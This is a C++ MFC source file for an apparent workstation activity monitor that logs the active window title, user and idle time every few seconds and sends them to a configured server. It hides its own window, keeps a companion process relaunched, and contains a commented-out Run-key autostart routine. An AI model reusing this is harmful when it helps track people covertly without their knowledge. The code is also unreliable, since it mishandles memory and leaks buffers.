
// AWS4Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "AWS4.h"
#include "AWS4Dlg.h"
#include "afxdialogex.h"
#include "Psapi.h"
#include <strsafe.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include "time.h"
#include <ws2tcpip.h>
#include "IPask.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define WM_WINDOWPOSCHANGING        0x0046
#define MYWM_NOTIFYICON WM_USER +1 
#define X_REQUEST_INTERVAL 5000
#define X_HIDE_MODE
#define X_HIDE_TIME 0 //0 for unlim

#define INFO_BUFFER_SIZE 32767

// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg(); 

// Dialog Data
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CAWS4Dlg dialog




CAWS4Dlg::CAWS4Dlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CAWS4Dlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_LogView = _T("");
	m_visible = false;
	ghSemaphore = CreateSemaphore(NULL,1,1,NULL);
}

void CAWS4Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT1, m_LogView);
	DDX_Control(pDX, IDC_Start, m_StartButton);
	DDX_Control(pDX, IDC_Stop, m_StopButton);
	DDX_Control(pDX, IDC_EDIT1, m_LogVCntrl);
}

BEGIN_MESSAGE_MAP(CAWS4Dlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_Start, &CAWS4Dlg::OnClickedStart)
	ON_BN_CLICKED(IDC_Stop, &CAWS4Dlg::OnClickedStop)
	ON_WM_TIMER()
	ON_MESSAGE(WM_TRAY_NOTIFY, OnTrayNotify)
	ON_EN_CHANGE(IDC_server, &CAWS4Dlg::OnEnChangeserver)
	ON_BN_CLICKED(IDC_BUTTON1, &CAWS4Dlg::BT_Tray)
	ON_WM_WINDOWPOSCHANGING()
	ON_WM_CLOSE ()
END_MESSAGE_MAP()


// CAWS4Dlg message handlers

BOOL CAWS4Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	SetWindowText(L"AWS Client");
	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}


	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_StopButton.EnableWindow(0);
	IDexists=false;
	IPrequest=false;
	Client_ID=L"";
	Server_IP=L"";
	Server_PORT=L"";
	Test_IP();
	Test_id();

	//Uncomment for autostart            <<<<<------------------------------------------------------------------
	//autostart();

	HandleThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&Launch, this, 0, &IdThread_Tester);
	HandleThread = CreateThread(NULL, 0, ThreadF, this, 0, &IdThread_Requster);

	OnClickedStart();
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CAWS4Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		//dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}



void CAWS4Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CAWS4Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CAWS4Dlg::OnClickedStart()
{
	SetTimer(1,X_REQUEST_INTERVAL,0);
	m_StopButton.EnableWindow(1);
	m_StartButton.EnableWindow(0);
#ifdef X_HIDE_MODE
	this->ShowWindow(SW_HIDE);
	if(X_HIDE_TIME > 0)
	{
		SetTimer(2, X_HIDE_TIME, 0);
	}
#endif
}

void CAWS4Dlg::OnClickedStop()
{
	KillTimer(1);
	m_StopButton.EnableWindow(0);
	m_StartButton.EnableWindow(1);
}

bool CAWS4Dlg::EnableDebugPrivilege(BOOL bEnable)
{
    HANDLE hToken = nullptr;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE;

    TOKEN_PRIVILEGES tokenPriv;
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return FALSE;

    return TRUE;
}

CString CAWS4Dlg::ParseLastError() 
{ 
    // Retrieve the system error message for the last-error code

    LPVOID lpMsgBuf;
    //LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,dw,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPTSTR) &lpMsgBuf,0, NULL );

	CString retstr = (LPCTSTR)lpMsgBuf; 

    LocalFree(lpMsgBuf);
//    LocalFree(lpDisplayBuf);
    return retstr ; 
}

CString CAWS4Dlg::GetProcessUsername(HANDLE *phProcess, BOOL bIncDomain) 
{
	CString sname = L"";

    HANDLE tok = 0;
    HANDLE hProcess;
    TOKEN_USER *ptu;
    DWORD nlen, dlen;
    wchar_t name[300], dom[300], tubuf[300], *pret = 0;
    int iUse;

    //if phProcess is NULL we get process handle of this
    //process.
    hProcess = phProcess?*phProcess:GetCurrentProcess();

    //open the processes token
    if (!OpenProcessToken(hProcess,TOKEN_QUERY,&tok)) goto ert;

    //get the SID of the token
    ptu = (TOKEN_USER*)tubuf;
    if (!GetTokenInformation(tok,(TOKEN_INFORMATION_CLASS)1,ptu,300,&nlen)) goto ert;

    //get the account/domain name of the SID
    dlen = 300;
    nlen = 300;
    if (!LookupAccountSid(0, ptu->User.Sid, name, &nlen, dom, &dlen, (PSID_NAME_USE)&iUse)) goto ert; //LookupAccountSidA

    //copy info to our static buffer
    if (dlen && bIncDomain) 
	{
		sname = dom;
		sname += " ";
		sname += name;
    } 
	else 
	{
		sname = name;
    }
    ert:
    if (tok) CloseHandle(tok);

    return sname.GetString();
}

bool CAWS4Dlg::GetActiveProcessName(CString& resStr)
{
	resStr = "";
    CWnd* fgwnd = GetForegroundWindow();

	CString r_wintext;
	fgwnd->GetWindowText(r_wintext);

	int lpos = 0;
	int ppos = 0;
	while(lpos >= 0)
	{
		ppos = lpos;
		lpos = r_wintext.Find(L" - ",lpos+1);
	}
	
	resStr += "WindowText:\\t";
	if(0 == ppos)
	{
		resStr += r_wintext;
	}
	else
	{
		resStr += r_wintext.Left(ppos);
	}
	resStr += "\\r\\n";

	if (fgwnd)
    {
        DWORD pid = 0;
        GetWindowThreadProcessId(fgwnd->m_hWnd, &pid);
		HANDLE hndProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
		if(hndProc)
        {
			DWORD pnsize = MAX_PATH;
			WCHAR r_processname[MAX_PATH];
			if(QueryFullProcessImageName(hndProc, 0, r_processname, &pnsize))
			{
				//resStr += "ProcessName:\t";
				//resStr += r_processname;
				//resStr += "\r\n";

				resStr += "LoggedUser:\\t";
				resStr += GetProcessUsername(&hndProc, FALSE);
				resStr += "\\r\\n";

				CString r_productname;
				if(GetFileProperties(r_processname, r_productname))
				{
					resStr += r_productname;
					return true;
				}
			}
			CloseHandle(hndProc);
        }
    }
    return false;
}

bool CAWS4Dlg::GetFileProperties(const CString pszProcessPath, CString& resStr)
{
    PLONG infoBuffer; 
    DWORD infoSize;    
 
    struct LANGANDCODEPAGE { 
        WORD wLanguage;
        WORD wCodePage;
    } *pLangCodePage;
 

    const TCHAR *paramNames[] = {
            _T("FileDescription"),
//            _T("CompanyName"),
//           _T("FileVersion"),
//            _T("InternalName"),
//            _T("LegalCopyright"),
//            _T("LegalTradeMarks"),
//            _T("OriginalFilename"),
            _T("ProductName"),
//            _T("ProductVersion"),
//            _T("Comments"),
//            _T("Author")
    };
 
    TCHAR paramNameBuf[256]; 
    TCHAR *paramValue;     
    UINT paramSz;           
 

    infoSize = GetFileVersionInfoSize(pszProcessPath, NULL);
    if ( infoSize > 0 )
    {

        infoBuffer = (PLONG) malloc(infoSize);
        if ( 0 != GetFileVersionInfo(pszProcessPath, NULL, infoSize, infoBuffer) )
        {
          
            UINT cpSz;
            
            if ( VerQueryValue(infoBuffer,                      
                               _T("\\VarFileInfo\\Translation"),
                               (LPVOID*) &pLangCodePage,        
                               &cpSz) )                         
            {
                
                for (int cpIdx = 0; cpIdx < (int)(cpSz/sizeof(struct LANGANDCODEPAGE)); cpIdx++ )
                {

                    for (int paramIdx = 0; paramIdx < sizeof(paramNames)/sizeof(char*); paramIdx++)
                    {
                        
                        _stprintf(paramNameBuf, _T("\\StringFileInfo\\%04x%04x\\%s"),
                                        pLangCodePage[cpIdx].wLanguage, 
                                        pLangCodePage[cpIdx].wCodePage, 
                                        paramNames[paramIdx]);

                        if ( VerQueryValue(infoBuffer, paramNameBuf, (LPVOID*)&paramValue, &paramSz))
						{
							//resStr += "\t";
							resStr += paramNames[paramIdx];
							resStr += ":\\t";
							resStr += paramValue;
							resStr += "\\r\\n";
						}
                        else
						{
							//resStr += "\t";
							resStr += paramNames[paramIdx];
							resStr += "\\tHет информации \\r\\n";
						}
                    }
                }
            }
        }
 
        free(infoBuffer);
		return true;
    }
    else
	{
        resStr += "GetFileVersionInfoSize - нет данных???";
		return false;
	}
}

void CAWS4Dlg::OnTimer(UINT_PTR nIDEvent)
{
	switch(nIDEvent)
	{
	case 1:
		{
			//autostart();
			CString curmsg = L"";
	
			CString outstr;
			bool ret = GetActiveProcessName(outstr);
			curmsg += outstr;

			LASTINPUTINFO lastInputInfo;
			lastInputInfo.cbSize = sizeof(LASTINPUTINFO);
			GetLastInputInfo(&lastInputInfo);
			DWORD currentTime = GetTickCount();
			DWORD timeElapsed = (currentTime - lastInputInfo.dwTime)/1000;
			char str[64];
			_itoa_s(timeElapsed, str, 10);
			curmsg += "LastUserInput:\\t";
			curmsg += str;
			

			curmsg += "\\r\\nTime:\\t";
			curmsg +=timestamp();

			if(!ret)
			{
				curmsg += "\r\n!AWSError: ";
				curmsg += ParseLastError();
				curmsg += "\r\n";
			}


			if(!ret)
			{
				curmsg="!AWSError:";
				curmsg+=ParseLastError();
			}
			Push(curmsg);
			UpdateData(0);
		}
		break;
	case 2:
		{
			KillTimer(2);
			//this->ShowWindow(SW_SHOW);
		}
		break;
	}

}

inline int CAWS4Dlg::Request(CString request)
{
	char* file_name = "Error.log";
	FILE *file = fopen( file_name, "a" ); 
	int port,retval;
	struct addrinfo *results = NULL,
    *addrptr = NULL,
    hints;
	swscanf_s(Server_PORT, _T("%d"), &port);
	
	CString srv;

	if(IDexists)
	{
	request += "\\r\\nClientId:\\t";
	request += Client_ID;
	request += "\\r\\n";
	}

	size_t convertedCharsw = 0;
	
	//Server_IP=L"localhost";

	size_t newsizew = (request.GetLength()+1)*2;
	//From CString to char
	char * v_reqstr = new char[newsizew];
	wcstombs_s(&convertedCharsw, v_reqstr, newsizew, request, _TRUNCATE );
	//From CString to char
	newsizew = (Server_IP.GetLength()+1)*2;
	char * v_rhost = new char[newsizew];
	wcstombs_s(&convertedCharsw, v_rhost, newsizew, Server_IP, _TRUNCATE );
	
    
	newsizew = (Server_PORT.GetLength()+1)*2;
	char * v_port = new char[newsizew];
	wcstombs_s(&convertedCharsw, v_port, newsizew, Server_PORT, _TRUNCATE );

	
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) 
	{
		if(file) 
		{
		  	fputs( "WSASturtup Error\r\n", file );
		}
		WSACleanup();
		fclose(file);
		delete[] v_rhost,v_reqstr,v_port;
		return 0;
    }

	memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
	
	retval = getaddrinfo(
                        v_rhost,
                        v_port,
                        &hints,
                        &results
                        );
	 if (retval != 0)
    {
		if(file) 
		{
		  	fputs( "Wrong IP Adress\r\n", file );
		}
		WSACleanup();
		delete[] v_rhost,v_reqstr,v_port;
		fclose(file);
		return 0;
    }
	

    SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    hostent *host;
    host = gethostbyname(v_rhost);
    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(port);
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) == SOCKET_ERROR)
	{
		if(file) 
		{
		  	fputs( "Unable connect to the server\r\n", file );
		}
		closesocket(Socket);
		WSACleanup();
		fclose(file);
		delete[] v_rhost,v_reqstr,v_port;
		return 0;
	}

    send(Socket, v_reqstr, strlen(v_reqstr),0);
	
	char * buff = new char [1000];
	int i=0;
		

	recv(Socket,buff,1000,0);

	
	srv=L"";
	while (buff[i] >= 32 || buff[i] == '\n' || buff[i] == '\r') 
		{
			srv+=CString(buff[i++]);	
		}
	

    closesocket(Socket);
    WSACleanup();
	fclose(file);

	if(srv[0]=='o'&&srv[1]=='k'&&IDexists)
	{
		delete[] buff,v_rhost,v_reqstr,v_port;
		return 1;
	}
	else if(srv[0]=='I'&&srv[1]=='D'&&srv[2]=='='&&!IDexists)
	{
		i=3;
		while(srv[i])
		{
			Client_ID+=srv[i++];
		}
		
		RegID(Client_ID); // Create a Registry Key and Set Value
		IDexists=true;
		delete[] buff,v_rhost,v_reqstr,v_port;
		return 1;
	}
	else if(srv[0]=='I'&&srv[1]=='P'&&srv[2]=='!'&&IPrequest)
	{
		IPrequest=false;
		delete[] buff,v_rhost,v_reqstr,v_port;
		return 1;
	}
	else
	{
		delete[] buff,v_rhost,v_reqstr,v_port;
		return 0;
	}
}

DWORD WINAPI CAWS4Dlg::ThreadF(void *arg)
    {
        return ((CAWS4Dlg*)arg)->Reqqueue();
    }

unsigned long CAWS4Dlg::Reqqueue()
{	
	while(true)
	{
		if(Size())
		{
			if(Request(Front()))
			{
				Pop();
			}
			else
			{
				Sleep(3000);
			}
		}
	Sleep(500);
	}
	return 1;
}

CString CAWS4Dlg::timestamp()
{
	char c[20];
	CString crtime=L"";
	time_t t = time(NULL);
	tm* timePtr = localtime(&t);

	sprintf_s(c, "%d", timePtr->tm_mday);
	crtime+=CString(c);
	sprintf_s(c, "%d", timePtr->tm_mon+1);
	crtime+=CString(".");
	crtime+=CString(c);
	sprintf_s(c, "%d", timePtr->tm_year+1900);
	crtime+=CString(".");
	crtime+=CString(c);
	crtime+=L".";
	sprintf_s(c, "%d", timePtr->tm_hour);
	crtime+=c;
	crtime+=L":";
	sprintf_s(c, "%d", timePtr->tm_min);
	crtime+=c;
	crtime+=L":";
	
	

    return crtime; 
}

void CAWS4Dlg::OnEnChangeserver()
{
	
}

void CAWS4Dlg::BT_Tray()
{
	ShowWindow(SW_HIDE);
	NOTIFYICONDATA nf;
	nf.hWnd = m_hWnd;
	nf.uID = 0x1234;
	nf.uFlags = NIF_MESSAGE|NIF_ICON|NIF_TIP;
	nf.uCallbackMessage = WM_TRAY_NOTIFY;
	HICON hIcon;
	hIcon=AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	nf.hIcon = hIcon;
	Shell_NotifyIcon(NIM_ADD,&nf);
}

int CAWS4Dlg::Test_id()
{
	CRegKey key;
	LONG status = key.Open(HKEY_CURRENT_USER, L"Software\\AWS");
	if (status == ERROR_SUCCESS)
	{
		wchar_t setting[255];
		DWORD settingSize=sizeof(setting);
		status = key.QueryValue(setting, L"ID", &settingSize);
		if (status == ERROR_SUCCESS)
		{
			Client_ID=CString(setting);
			IDexists=true;
			key.Close(); 
			return 1;
		}
		else
		{
			key.Close(); 
			Push(L"ID?\r\n");
			return 0;
		}
		key.Close(); 
		return 0;
	}
	else
	{
		key.Close(); 
		return 0;
	}
}

int CAWS4Dlg::Test_IP()
{
	CRegKey key;
	LONG status = key.Open(HKEY_CURRENT_USER, L"Software");
	if(status == ERROR_SUCCESS)
	{
		status = key.Create(key.m_hKey,L"AWS");
	}
		
	
	status = key.Open(HKEY_CURRENT_USER, L"Software\\AWS");
	if (status == ERROR_SUCCESS)
	{
		wchar_t setting[255];
		DWORD settingSize=sizeof(setting);
		status = key.QueryValue(setting, L"IP", &settingSize);
		if (status == ERROR_SUCCESS)
		{
			Server_IP=CString(setting);
			key.QueryValue(setting, L"PORT", &settingSize);
			Server_PORT=CString(setting);
			key.Close(); 
			return 1;
		}
		else
		{
			CIPask dlg;
			dlg.DoModal();
			status=key.QueryValue(setting, L"IP", &settingSize);
			Server_IP=CString(setting);
			key.QueryValue(setting, L"PORT", &settingSize);
			Server_PORT=CString(setting);
					
			if (status == ERROR_SUCCESS)
			{
				key.Close(); 
				return 1;
			}

			key.Close(); 
			return 0;
		}
	}
	else
	{
		key.Close(); 
		return 0;
	}
	return 0;
}

void CAWS4Dlg::Launch()
{
	while(true)
	{
		if(!FindProcessId(L"AWS Check.exe"))
		{
			STARTUPINFO si = {};
			si.cb = sizeof si;
			PROCESS_INFORMATION pi = {};
			const TCHAR* target = _T("AWS Check.exe");
			CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi);
		}
		Sleep(5000);
	}
}

DWORD CAWS4Dlg::FindProcessId(const std::wstring& processName)
{
  PROCESSENTRY32 processInfo;
  processInfo.dwSize = sizeof(processInfo);

  HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
  if ( processesSnapshot == INVALID_HANDLE_VALUE )
    return 0;

  Process32First(processesSnapshot, &processInfo);
  if ( !processName.compare(processInfo.szExeFile) )
  {
    CloseHandle(processesSnapshot);
    return processInfo.th32ProcessID;
  }

  while ( Process32Next(processesSnapshot, &processInfo) )
  {
    if ( !processName.compare(processInfo.szExeFile) )
    {
      CloseHandle(processesSnapshot);
      return processInfo.th32ProcessID;
    }
  }

  CloseHandle(processesSnapshot);
  return 0;
}

LRESULT CAWS4Dlg::OnTrayNotify(UINT nID, LPARAM lEvent)
{
    if (nID==TRAYICON_ID1)
    {   
        // handle messages here
        if (lEvent==WM_LBUTTONDBLCLK)
        {  
			ShowWindow(SW_RESTORE);
			NOTIFYICONDATA nf;
			nf.hWnd = m_hWnd;
			nf.uID = 0x1234;
			nf.uFlags = NIF_MESSAGE|NIF_ICON|NIF_TIP;
			nf.uCallbackMessage = WM_TRAY_NOTIFY;
			nf.hIcon = NULL;
			Shell_NotifyIcon(NIM_DELETE,&nf);
        }
        if (lEvent==WM_RBUTTONUP)
        {  // do right button up, usually popup a menu at clicked location
        }
    }
	return 0;
}

void CAWS4Dlg::OnClose()
{
	if(!FindProcessId(L"AWS Check.exe"))
	{
		STARTUPINFO si = {};
		si.cb = sizeof si;
		PROCESS_INFORMATION pi = {};
		const TCHAR* target = _T("AWS Check.exe");
		CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi);
	}
	__super::OnClose();
}

int CAWS4Dlg::RegID (CString Client_ID)
{
	CRegKey key;
	LPCTSTR Directory = L"Software\\AWS";
	LONG status = key.Open(HKEY_CURRENT_USER,Directory);
		if (status == ERROR_SUCCESS)
		{
			status=key.SetValue(Client_ID,L"ID");
			if (status == ERROR_SUCCESS)
			{
				key.Close(); 
				return 1;
			}
			else
			{
				key.Close(); 
				return 0;
			}
		}
		else
		{
			key.Close(); 
			return 0;
		}
}

int CAWS4Dlg::autostart()
{
	CRegKey key;
	LONG status = key.Open(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");

	if (status == ERROR_SUCCESS)
	{
		status=key.SetValue(L"\"C:\\Program Files\\Lanar\\AWS\\AWS4.exe\" -autorun",L"AWS");
		
		if (status == ERROR_SUCCESS)
		{
			key.Close(); 
			return 1;
		}
	}
	return 0;
	key.Close(); 
}

void CAWS4Dlg::OnWindowPosChanging(WINDOWPOS* lpwndpos)
{
	CDialog::OnWindowPosChanging(lpwndpos);
	if(lpwndpos->flags&SWP_SHOWWINDOW)
	{
		if(!m_visible)
		{
			m_visible=true;
			lpwndpos->flags&=~SWP_SHOWWINDOW;        
		}
    }
}

int CAWS4Dlg::change (char* Input,char* Output,int iNumStr)
{
	char *i;
	FILE* pIn = fopen (Input, "r");
	FILE* pOut = fopen (Output, "w");
	if(!pOut||!pIn)
	{
		return 0;
	}
	int iCurStr = 0;
	char szBuf [256];
 
	while ( feof (pIn) == 0 )
	{
	   i = fgets (szBuf, 256, pIn);

	   if (i&&iCurStr != iNumStr)
	   {
		   fputs (szBuf, pOut);
	   }	   
	   iCurStr++;
	}
 
	fclose (pOut);
	fclose (pIn);
	return 1;
}

int CAWS4Dlg::Pop()
{
    DWORD dwWaitResult; 
    BOOL bContinue=TRUE;
    while(bContinue)
    {

        dwWaitResult = WaitForSingleObject(ghSemaphore,0L);

		if(WAIT_OBJECT_0==dwWaitResult)
        { 
                bContinue=FALSE;            

                // Simulate thread spending time on task <-----
				char* i,*Input="input.txt",*Output="output.txt";
				change(Input,Output,0);
				FILE* pOut = fopen (Input, "w");
				FILE* pIn = fopen (Output, "r");
				if(!pOut||!pIn)
				{
					ReleaseSemaphore(ghSemaphore,1,NULL);
					return 0;
				}
				char szBuf [1024];
 
				while ( feof (pIn) == 0)
				{
					i=fgets (szBuf, 1024, pIn);
					if(i)
				    {
						fputs (szBuf, pOut);
					}
				}
 
			fclose (pOut);
			fclose (pIn);
                // Release the semaphore when task is finished

                if (!ReleaseSemaphore( 
                        ghSemaphore,  // handle to semaphore
                        1,            // increase count by one
                        NULL) )       // not interested in previous count
                {
                    //printf("ReleaseSemaphore error: %d\n", GetLastError()); <---- Error
					return 0;
                }
        }
    }
	return 1;
}

int CAWS4Dlg::Size()
{
    DWORD dwWaitResult; 
    BOOL bContinue=TRUE;
    while(bContinue)
    {

        dwWaitResult = WaitForSingleObject(ghSemaphore,0L);

		if(WAIT_OBJECT_0==dwWaitResult)
        { 
                bContinue=FALSE;            

                // Simulate thread spending time on task <-----
				int size=0;
				std::fstream file("input.txt");
				file.seekg (0, std::ios::end);
				if(file.tellg()>0)
				{
					size = file.tellg();
				}
				file.close();
                // Release the semaphore when task is finished

                if (!ReleaseSemaphore( 
                        ghSemaphore,  // handle to semaphore
                        1,            // increase count by one
                        NULL) )       // not interested in previous count
                {
                    //printf("ReleaseSemaphore error: %d\n", GetLastError()); <---- Error
                }
				return size;
        }
    }
	return -1;
}

CString CAWS4Dlg::Front()
{
    DWORD dwWaitResult; 
    BOOL bContinue=TRUE;
    while(bContinue)
    {

        dwWaitResult = WaitForSingleObject(ghSemaphore,0L);

		if(WAIT_OBJECT_0==dwWaitResult)
        { 
                bContinue=FALSE;            

                // Simulate thread spending time on task <-----

				FILE* file = fopen ("input.txt", "r");
				char szBuf [1024];
				fgets (szBuf, 1024, file);
				fclose (file);
				std::string s_szBuf=szBuf;
                // Release the semaphore when task is finished

                if (!ReleaseSemaphore( 
                        ghSemaphore,  // handle to semaphore
                        1,            // increase count by one
                        NULL) )       // not interested in previous count
                {
                    //printf("ReleaseSemaphore error: %d\n", GetLastError()); <---- Error
                }
				return CString(s_szBuf.c_str());
        }
    }
	return 0;
}

void CAWS4Dlg::Push(CString szBuf)
{
    DWORD dwWaitResult; 
    BOOL bContinue=TRUE;
    while(bContinue)
    {

        dwWaitResult = WaitForSingleObject(ghSemaphore,0L);

		if(WAIT_OBJECT_0==dwWaitResult)
        { 
                bContinue=FALSE;            

                // Simulate thread spending time on task <-----

				size_t convertedCharsw = 0;
				size_t newsizew = (szBuf.GetLength()+1)*2;
				char * str = new char[newsizew];
				wcstombs_s(&convertedCharsw, str, newsizew, szBuf, _TRUNCATE );

				FILE* file = fopen ("input.txt", "a");
				fputs (str, file);
				fclose (file);
                // Release the semaphore when task is finished

                if (!ReleaseSemaphore( 
                        ghSemaphore,  // handle to semaphore
                        1,            // increase count by one
                        NULL) )       // not interested in previous count
                {
                    //printf("ReleaseSemaphore error: %d\n", GetLastError()); <---- Error
                }
        }
    }
}
